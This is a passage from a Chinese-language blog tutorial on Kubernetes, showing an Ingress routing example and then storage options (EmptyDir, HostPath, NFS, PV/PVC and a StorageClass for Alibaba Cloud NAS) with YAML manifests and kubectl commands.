class="hljs-operator">-</span> <span class="hljs-params">host:</span> demo.example.com                  <span class="hljs-comment"># 域名</span><br>      <span class="hljs-params">http:</span><br>        <span class="hljs-params">paths:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-params">path:</span> <span class="hljs-symbol">/</span>                           <span class="hljs-comment"># HTTP 路由 1</span><br>            <span class="hljs-params">pathType:</span> Prefix<br>            <span class="hljs-params">backend:</span><br>              <span class="hljs-params">service:</span><br>                <span class="hljs-params">name:</span> demo-app-http-<span class="hljs-number">1</span>         <span class="hljs-comment"># 分发的 Service</span><br>                <span class="hljs-params">namespace:</span> namespace-<span class="hljs-number">1</span>        <span class="hljs-comment"># 显式指定命名空间</span><br>                <span class="hljs-params">port:</span><br>                  <span class="hljs-params">number:</span> <span class="hljs-number">80</span>                  <span class="hljs-comment"># Service 的端口</span><br>          <span class="hljs-operator">-</span> <span class="hljs-params">path:</span> <span class="hljs-symbol">/path2</span>                      <span class="hljs-comment"># HTTP 路由 2</span><br>            <span class="hljs-params">pathType:</span> Prefix<br>            <span class="hljs-params">backend:</span><br>              <span class="hljs-params">service:</span><br>                <span class="hljs-params">name:</span> demo-app-http-<span class="hljs-number">2</span><br>                <span class="hljs-params">namespace:</span> namespace-<span class="hljs-number">2</span>        <span class="hljs-comment"># 显式指定命名空间</span><br>                <span class="hljs-params">port:</span><br>                  <span class="hljs-params">number:</span> <span class="hljs-number">80</span><br>          <span class="hljs-operator">-</span> <span class="hljs-params">path:</span> <span class="hljs-symbol">/path3</span>                      <span class="hljs-comment"># HTTP 路由 3</span><br>            <span class="hljs-params">pathType:</span> Prefix<br>            <span class="hljs-params">backend:</span><br>              <span class="hljs-params">service:</span><br>                <span class="hljs-params">name:</span> demo-app-http-<span class="hljs-number">3</span><br>                <span class="hljs-params">namespace:</span> namespace-<span class="hljs-number">1</span>        <span class="hljs-comment"># 显式指定命名空间</span><br>                <span class="hljs-params">port:</span><br>                  <span class="hljs-params">number:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>关于 HTTPS 的使用，还有自动续签证书、重写、限流、认证等高级用法，以及相关插件等内容，可以在后续进一步学习。</li><li>这些被分发的应用服务 Service 不需要与 Nginx Ingress Controller 位于同一命名空间。然而，如果在多个命名空间下存在相同名称的服务（例如，多个命名空间中都有 <code>demo-app-http-3</code>），我们可以通过显式指定服务的命名空间来避免冲突。</li></ol></blockquote><p>&#x3D;&#x3D;2.创建 Ingress 资源&#x3D;&#x3D;</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">kubectl <span class="hljs-built_in">apply</span> -f <span class="hljs-built_in">demo</span>-ingress.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 Ingress 资源状态&#x3D;&#x3D;</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">kubectl <span class="hljs-built_in">describe</span> ingress <span class="hljs-built_in">demo</span>-ingress<br></code></pre></td></tr></table></figure><hr><h3 id="11-K8S-核心概念：K8S-存储"><a href="#11-K8S-核心概念：K8S-存储" class="headerlink" title="11. K8S 核心概念：K8S 存储"></a>11. K8S 核心概念：K8S 存储</h3><h4 id="11-1-K8S-存储-的组成"><a href="#11-1-K8S-存储-的组成" class="headerlink" title="11.1. K8S 存储 的组成"></a>11.1. K8S 存储 的组成</h4><p>K8S 存储由以下几部分组成：</p><ol><li>&#x3D;&#x3D;EmptyDir&#x3D;&#x3D;：<ol><li><code>EmptyDir</code> 是当 Pod 创建时，Kubernetes 会自动在 Pod 所在宿主机上为其分配一个临时目录（ <code>/var/lib/kubelet/pods/&lt;pod-id&gt;/volumes/kubernetes.io~empty-dir/</code> ）该 Pod 内的所有容器都可以读写这个目录。</li><li>然而，<font color="#ff0000">一旦 Pod 挂掉或迁移，数据将不可被访问</font>，直到 Kubelet 定期清理 <code>/var/lib/kubelet</code> 下的无用数据时才会被删除。</li></ol></li><li>&#x3D;&#x3D;HostPath&#x3D;&#x3D;：<ol><li><code>HostPath</code> 允许 Pod 内的容器访问 Pod 所在宿主机的特定目录，如果多个 Pod 在同一个 Node 上，可以共享该数据，即便 Pod 挂掉或迁移，数据仍然在宿主机上</li><li>然而，由于数据存储在宿主机上，当 Pod 迁移到其他节点时，就无法访问原节点上的数据，无法访问原宿主机上的 HostPath 存储卷，只能访问当前节点的 HostPath 路径下的数据，每个节点上的 HostPath 存储卷数据可能不同，这可能导致数据不一致。</li><li>需要特别注意的是，K8S 不会自动创建目录，我们必须手动在宿主机上预先创建目录。如果目录不存在，可能会导致问题。</li></ol></li><li>&#x3D;&#x3D;NFS&#x3D;&#x3D;：<ol><li><code>NFS</code> 可以让 Pod 从远程 NFS 服务器中读写数据，可以跨多个 Pod 和 Node 共享数据</li><li>需要特别注意的是，通常情况下，NFS 不需要由 Kubernetes 管理或配置，它是一个独立的外部服务，负责数据存储和共享。</li><li>同样的，K8S 不会自动创建目录，我们必须手动在宿主机上预先创建目录。如果目录不存在，可能会导致问题。</li></ol></li><li>&#x3D;&#x3D;PV&#x2F;PVC&#x3D;&#x3D;：<ol><li>传统存储方式（如 HostPath、EmptyDir、NFS）需要在 Pod 配置中直接指定数据存储路径。而 PV 和 PVC 是 Kubernetes 对存储资源的统一抽象和管理机制。PV 负责定义存储位置和大小，PVC 则负责申请这些存储资源，Pod 只需挂载 PVC 即可。</li><li>即使底层存储发生变化（例如从 NFS 更换为云存储），其他配置无需修改。管理员只需更新 PV 配置即可，无需修改 Pod 或 PVC 配置</li><li>同样的，K8S 不会自动创建目录，我们必须手动在宿主机上预先创建目录。如果目录不存在，可能会导致问题。</li></ol></li><li>&#x3D;&#x3D;ConfigMap&#x3D;&#x3D;：<ol><li><code>ConfigMap</code> <strong>用于存储非敏感的配置信息</strong>，如应用配置、环境变量和配置文件等。它可以包含配置文件、属性对，甚至 JSON 对象。设计初衷是方便多个 Pod 共享和管理配置。</li><li>如果应用的配置文件较小（例如小于 1MB），推荐使用 <code>ConfigMap</code>，而不是通过 NFS 挂载</li></ol></li><li>&#x3D;&#x3D;Secret&#x3D;&#x3D;：<ol><li>与 <code>ConfigMap</code> 不同，<code>Secret</code> <strong>通过 RBAC 控制访问</strong>，<strong>用于存储敏感信息</strong>，如密码、Token 和私钥等，具有更高的安全性。</li></ol></li></ol><hr><h4 id="11-2-EmptyDir（Volume-挂载）实战步骤"><a href="#11-2-EmptyDir（Volume-挂载）实战步骤" class="headerlink" title="11.2. EmptyDir（Volume 挂载）实战步骤"></a>11.2. EmptyDir（Volume 挂载）实战步骤</h4><p><code>EmptyDir</code> 需要在 Pod 中通过 Volume 挂载才能使用。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> test-pd<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">volumes:</span>                                     <span class="hljs-comment"># 定义 Pod 级别的存储卷</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> cache-volume                       <span class="hljs-comment"># 存储卷名称</span><br>      <span class="hljs-params">emptyDir:</span> &#123;&#125;                             <span class="hljs-comment"># 使用 emptyDir 存储方式</span><br><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">image:</span> docker.io<span class="hljs-symbol">/nazarpc/webserver</span><br>      <span class="hljs-params">name:</span> test-container<br>      <span class="hljs-params">volumeMounts:</span>                            <span class="hljs-comment"># 容器内卷的挂载配置</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> cache-volume                   <span class="hljs-comment"># 指定要挂载的存储卷的名称</span><br>          <span class="hljs-params">mountPath:</span> <span class="hljs-symbol">/cache</span>                    <span class="hljs-comment"># 挂载点，即存储卷挂载到容器内的哪个目录</span><br>          <span class="hljs-params">readOnly:</span> <span class="hljs-literal">false</span>                      <span class="hljs-comment"># 是否以只读的方式挂载</span><br></code></pre></td></tr></table></figure><hr><h4 id="11-3-HostPath（Volume-挂载）实战步骤"><a href="#11-3-HostPath（Volume-挂载）实战步骤" class="headerlink" title="11.3. HostPath（Volume 挂载）实战步骤"></a>11.3. HostPath（Volume 挂载）实战步骤</h4><p><code>HostPath</code> 需要在 Pod 中通过 Volume 挂载才能使用。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> test-pd<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">volumes:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> test-volume<br>      <span class="hljs-params">hostPath:</span>                              <span class="hljs-comment"># 使用 hostPath 存储方式</span><br>        <span class="hljs-params">path:</span> <span class="hljs-symbol">/data</span>                          <span class="hljs-comment"># 需要挂载的宿主机的目录</span><br>        <br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">image:</span> docker.io<span class="hljs-symbol">/nazarpc/webserver</span><br>      <span class="hljs-params">name:</span> test-container<br>      <span class="hljs-params">volumeMounts:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> test-volume<br>          <span class="hljs-params">mountPath:</span> <span class="hljs-symbol">/test-pd</span><br>          <span class="hljs-params">readOnly:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><hr><h4 id="11-4-NFS-实战步骤"><a href="#11-4-NFS-实战步骤" class="headerlink" title="11.4. NFS 实战步骤"></a>11.4. NFS 实战步骤</h4><h5 id="11-4-1-NFS-环境搭建"><a href="#11-4-1-NFS-环境搭建" class="headerlink" title="11.4.1. NFS 环境搭建"></a>11.4.1. NFS 环境搭建</h5><p>NFS 环境搭建见：<a href="https://blog.wangjia.xin/2025/03/22/%E7%AC%94%E8%AE%B0%EF%BC%9ANFS/">Categories&#x2F;数据管理&#x2F;NFS</a></p><hr><h5 id="11-4-2-挂载-NFS-共享目录"><a href="#11-4-2-挂载-NFS-共享目录" class="headerlink" title="11.4.2. 挂载 NFS 共享目录"></a>11.4.2. 挂载 NFS 共享目录</h5><p><code>NFS</code> 需要在 Pod 中通过 Volume 挂载才能使用。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> redis<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">volumes:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> redis-persistent-storage<br>      <span class="hljs-params">nfs:</span>                                    <span class="hljs-comment"># 使用 NFS 存储方式</span><br>        <span class="hljs-params">path:</span> <span class="hljs-symbol">/k8s-nfs/redis/data</span>             <span class="hljs-comment"># NFS 服务器上的共享目录路径</span><br>        <span class="hljs-params">server:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">126.112</span>               <span class="hljs-comment"># NFS 服务器的 IP 地址（推荐使用域名）</span><br><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">image:</span> redis<br>      <span class="hljs-params">name:</span> redis<br>      <span class="hljs-params">volumeMounts:</span>                           <span class="hljs-comment"># 挂载存储卷到容器内</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">mountPath:</span> <span class="hljs-symbol">/data</span>                    <span class="hljs-comment"># 将存储卷的目录挂载到容器的 /data 目录</span><br>          <span class="hljs-params">name:</span> redis-persistent-storage      <span class="hljs-comment"># 对应上面定义的存储卷名称，确保正确挂载</span><br></code></pre></td></tr></table></figure><hr><h4 id="11-5-PV-PVC（Volume-挂载）-实战步骤"><a href="#11-5-PV-PVC（Volume-挂载）-实战步骤" class="headerlink" title="11.5. PV + PVC（Volume 挂载） 实战步骤"></a>11.5. PV + PVC（Volume 挂载） 实战步骤</h4><h5 id="11-5-1-基于-阿里云-NAS"><a href="#11-5-1-基于-阿里云-NAS" class="headerlink" title="11.5.1. 基于 阿里云 NAS"></a>11.5.1. 基于 阿里云 NAS</h5><h6 id="11-5-1-1-所有节点安装-NFS-客户端"><a href="#11-5-1-1-所有节点安装-NFS-客户端" class="headerlink" title="11.5.1.1. 所有节点安装 NFS 客户端"></a>11.5.1.1. 所有节点安装 NFS 客户端</h6><p>安装 NFS 客户端见：<a href="https://blog.wangjia.xin/2025/03/22/%E7%AC%94%E8%AE%B0%EF%BC%9ANFS/">Categories&#x2F;数据管理&#x2F;NFS</a></p><hr><h6 id="11-5-1-2-基于-StorageClass-资源（可选）"><a href="#11-5-1-2-基于-StorageClass-资源（可选）" class="headerlink" title="11.5.1.2. 基于 StorageClass 资源（可选）"></a>11.5.1.2. 基于 StorageClass 资源（可选）</h6><p>&#x3D;&#x3D;1.StorageClass 的作用&#x3D;&#x3D;<br><code>StorageClass</code> 可以根据 PVC 动态创建 PV，无需手动预先定义 PV 资源</p><p>&#x3D;&#x3D;2.安装阿里云 NAS CSI 插件&#x3D;&#x3D;</p><p><a href="https://help.aliyun.com/zh/nas/user-guide/mount-nas-by-using-alibaba-cloud-csi-storage-components-recommend#8936ec00590ea">https://help.aliyun.com/zh/nas/user-guide/mount-nas-by-using-alibaba-cloud-csi-storage-components-recommend#8936ec00590ea</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stata"># 1. 下载部署文件<br>wget https:<span class="hljs-comment">//github.com/kubernetes-sigs/alibaba-cloud-csi-driver/archive/refs/tags/v1.2.1.tar.gz</span><br><br>tar -zxvf v1.2.1.tar.gz<br><br><br>下载 <span class="hljs-keyword">zip</span>上传<br><br>uzip alibaba-cloud-<span class="hljs-keyword">csi</span>-driver-release-v1.1.0.<span class="hljs-keyword">zip</span><br><br><span class="hljs-keyword">cd</span> alibaba-cloud-<span class="hljs-keyword">csi</span>-driver-release-v1.1.0/deploy<br><br><br>kubectl create -f ./rbac.yaml<br><br>kubectl create -f ./deploy/nas/nas-<span class="hljs-keyword">plugin</span>.yaml<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：</p><ol><li>选版本：<a href="https://github.com/kubernetes-sigs/alibaba-cloud-csi-driver">github&#x2F;alibaba-cloud-csi-driver</a>，code -&gt;branches &#x2F; tags 然后加个xxx.git就行了用tages 就行了<br>标签用于表示代码的一个固定快照，通常用于发布版本。<br>该过程碎石可能变化，详细你还是要看 README 文档啊，看 NAS  CSI 的</li></ol></blockquote><p>步骤都在文档中了，用哪个版本的就看那个版本的文档，看 nas csi 的<br>找他妈release 的，mlgb</p><p>&#x3D;&#x3D;2.编写 StorageClass 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> storage.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> StorageClass<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> nas-storage                              <span class="hljs-comment"># StorageClass 的名称</span><br><span class="hljs-params">provisioner:</span> nasplugin.csi.alibabacloud.com      <span class="hljs-comment"># 使用阿里云 NAS CSI 插件</span><br><span class="hljs-params">reclaimPolicy:</span> Retain<br><span class="hljs-params">volumeBindingMode:</span> Immediate<br><span class="hljs-params">allowVolumeExpansion:</span> <span class="hljs-literal">true</span><br><span class="hljs-params">parameters:</span><br>  <span class="hljs-params">server:</span> <span class="hljs-string">&quot;xxx.cn-hangzhou.nas.aliyuncs.com&quot;</span>     <span class="hljs-comment"># NAS 服务地址</span><br>  <span class="hljs-params">path:</span> <span class="hljs-string">&quot;/k8s-data&quot;</span>                              <span class="hljs-comment"># NAS 挂载路径</span><br>  <span class="hljs-params">vers:</span> <span class="hljs-string">&quot;4.0&quot;</span>                                    <span class="hljs-comment"># NFS 协议版本</span><br>  <span class="hljs-params">archiveOnDelete:</span> <span class="hljs-string">&quot;false&quot;</span>                       <span class="hljs-comment"># 删除 PVC 时不自动归档</span><br><span class="hljs-params">mountOptions:</span>                                    <span class="hljs-comment"># NFS 挂载参数</span><br>  <span class="hljs-operator">-</span> nolock<br>  <span class="hljs-operator">-</span> vers<span class="hljs-operator">=</span><span class="hljs-number">4.0</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.创建 StorageClass 资源&#x3D;&#x3D;</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kubectl apply <span class="hljs-operator">-f</span> <span class="hljs-built_in">sc</span><span class="hljs-literal">-nas</span>.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.检查 StorageClass 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> storageclass<br></code></pre></td></tr></table></figure><hr><h6 id="11-5-1-3-创建-PV-资源"><a href="#11-5-1-3-创建-PV-资源" class="headerlink" title="11.5.1.3. 创建 PV 资源"></a>11.5.1.3. 创建 PV 资源</h6><p>&#x3D;&#x3D;1.编写 PV 资源 yaml 文件&#x3D;&#x3D;<br>如果使用了 StorageClass，则无需手动创建 PV 资源；否则，需要手动创建 PV 资源。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> PersistentVolume<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> nas-pv<br><span class="hljs-symbol">spec:</span><br><span class="hljs-symbol">  capacity:</span><br><span class="hljs-symbol">    storage:</span> <span class="hljs-number">20</span>Gi<br><span class="hljs-symbol">  accessModes:</span><br>    - ReadWriteMany<br><span class="hljs-symbol">  persistentVolumeReclaimPolicy:</span> Retain<br><span class="hljs-symbol">  storageClassName:</span> nas-storage                       <span class="hljs-meta"># 指定 StorageClass</span><br><span class="hljs-symbol">  csi:</span>                                                <span class="hljs-meta"># 存储后端配置，这里使用 CSI 插件对接阿里云 NAS</span><br><span class="hljs-symbol">    driver:</span> nasplugin.csi.alibabacloud.com            <span class="hljs-meta"># 指定使用阿里云 NAS CSI 驱动</span><br><span class="hljs-symbol">    volumeHandle:</span> nas-pv                              <span class="hljs-meta"># 唯一标识符，用于 K8S 与 NAS 之间建立联系</span><br><span class="hljs-symbol">    volumeAttributes:</span>                                 <span class="hljs-meta"># NAS 存储相关属性配置</span><br><span class="hljs-symbol">      server:</span> <span class="hljs-string">&quot;xxx.cn-hangzhou.nas.aliyuncs.com&quot;</span>      <span class="hljs-meta"># NAS 挂载点地址</span><br><span class="hljs-symbol">      path:</span> <span class="hljs-string">&quot;/k8s_share&quot;</span>                              <span class="hljs-meta"># NAS 文件系统内的子路径</span><br><span class="hljs-symbol">      vers:</span> <span class="hljs-string">&quot;4.0&quot;</span>                                     <span class="hljs-meta"># NFS 协议版本</span><br><span class="hljs-symbol">      options:</span>                                        <span class="hljs-meta"># NFS 挂载参数</span><br>    - nolock<br>    - noresvport<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">唯一标识符</font>：<ul><li><code>volumeHandle</code> 是一个唯一标识符，用来在存储系统（如阿里云NAS）和 Kubernetes 集群之间建立联系。</li></ul></li><li><font color="#00b0f0">NAS 子路径</font>：<ul><li>需要我们提前创建好</li></ul></li><li><font color="#00b0f0">NFS 协议版本</font>：<ul><li>阿里云 NAS 推荐使用 NFS 4.0 或 4.1</li><li><font color="#7030a0">4.0</font>：单通道传输，适合中小规模数据访问。</li><li><font color="#7030a0">4.1</font>：支持多通道传输，适合高并发和大规模分布式存储场景</li></ul></li><li><font color="#00b0f0">NFS 挂载参数</font>：<ul><li>无论你使用的是 NAS 还是 Ceph，只要你的服务基于 NFS 协议提供存储服务，就可以配置 NFS 挂载参数。</li></ul></li></ol></blockquote><p>&#x3D;&#x3D;2.创建 PV 资源&#x3D;&#x3D;</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">kubectl <span class="hljs-built_in">apply</span> -f nas-<span class="hljs-built_in">pv</span>.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 PV 资源状态&#x3D;&#x3D;</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">kubectl <span class="hljs-built_in">get</span> <span class="hljs-built_in">pv</span><br></code></pre></td></tr></table></figure><hr><h6 id="11-5-1-4-创建-PVC-资源"><a href="#11-5-1-4-创建-PVC-资源" class="headerlink" title="11.5.1.4. 创建 PVC 资源"></a>11.5.1.4. 创建 PVC 资源</h6><p>&#x3D;&#x3D;1.编写 PVC 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> PersistentVolumeClaim<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> nas-pvc<br><span class="hljs-symbol">spec:</span><br><span class="hljs-symbol">  accessModes:</span><br>    - ReadWriteMany<br><span class="hljs-symbol">  storageClassName:</span> nas-storage                   <span class="hljs-meta"># 指定 StorageClass</span><br><span class="hljs-symbol">  resources:</span><br><span class="hljs-symbol">    requests:</span><br><span class="hljs-symbol">      storage:</span> <span class="hljs-number">20</span>Gi<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 PVC 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f nas-pvc.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 PVC 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> pvc<br></code></pre></td></tr></table></figure><hr><h6 id="11-5-1-5-Pod-挂载-PVC"><a href="#11-5-1-5-Pod-挂载-PVC" class="headerlink" title="11.5.1.5. Pod 挂载 PVC"></a>11.5.1.5. Pod 挂载 PVC</h6><p>&#x3D;&#x3D;1.Pod 挂载 PVC&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> test-nfs<br>  <span class="hljs-params">namespace:</span> dev<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">volumes:</span>                                 <span class="hljs-comment"># 定义 Pod 使用的卷</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> nfs-volume                       <span class="hljs-comment"># 卷的名称</span><br>    <span class="hljs-params">persistentVolumeClaim:</span>                 <span class="hljs-comment"># 卷的数据来源，这里是来自 PVC</span><br>      <span class="hljs-params">claimName:</span> nfs-pvc                   <span class="hljs-comment"># PVC 的名称</span><br>      <br>  <span class="hljs-params">containers:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> app<br>    <span class="hljs-params">image:</span> nginx<br>    <span class="hljs-params">volumeMounts:</span>                          <span class="hljs-comment"># 容器内卷的挂载配置                     </span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> nfs-volume                     <span class="hljs-comment"># 指定挂载的卷名称</span><br>      <span class="hljs-params">mountPath:</span> <span class="hljs-symbol">/usr/share/nginx/html</span>     <span class="hljs-comment"># 挂载点，即容器内的目标路径</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">namespace 必须指定</font>：<ul><li>Pod 在挂载 PVC 时，必须与 PVC 在同一个命名空间，否则挂载会失败</li></ul></li><li><font color="#00b0f0">无需指定 readOnly</font>：<ul><li>不需要在 Pod 中再指定 <code>readOnly</code>，因为 <code>accessModes</code> 已经定义了存储的访问模式。</li></ul></li></ol></blockquote><p>&#x3D;&#x3D;2.检查 Pod 资源状态&#x3D;&#x3D;</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">kubectl describe pod <span class="hljs-keyword">my</span>-pod<br></code></pre></td></tr></table></figure><hr><h5 id="11-5-2-补充：PV-资源的写法"><a href="#11-5-2-补充：PV-资源的写法" class="headerlink" title="11.5.2. 补充：PV 资源的写法"></a>11.5.2. 补充：PV 资源的写法</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> PersistentVolume<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> nfs-pv<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">capacity:</span><br>    <span class="hljs-params">storage:</span> <span class="hljs-number">10</span>Gi                            <span class="hljs-comment"># 定义 PV 的存储容量，这里为 10Gi</span><br>    <span class="hljs-params">volumeMode:</span> Filesystem                   <span class="hljs-comment"># 存储模式，这里使用文件系统模式</span><br>  <span class="hljs-params">storageClassName:</span> nas-storage              <span class="hljs-comment"># 指定 StorageClass</span><br>  <span class="hljs-params">accessModes:</span>                               <br>    <span class="hljs-operator">-</span> ReadWriteMany                          <span class="hljs-comment"># 访问模式，这里是多个节点可同时读写</span><br>  <span class="hljs-params">persistentVolumeReclaimPolicy:</span> Retain      <span class="hljs-comment"># 回收策略，这里是PVC 释放后，PV 保留不删除</span><br>  <span class="hljs-params">nfs:</span>                                       <span class="hljs-comment"># 存储后端配置，不同存储类型配置方式不同，这里使用 NFS 存储</span><br>    <span class="hljs-params">path:</span> <span class="hljs-symbol">/data</span>                              <span class="hljs-comment"># NFS 服务上的导出目录路径</span><br>    <span class="hljs-params">server:</span> <span class="hljs-number">192.168</span>.<span 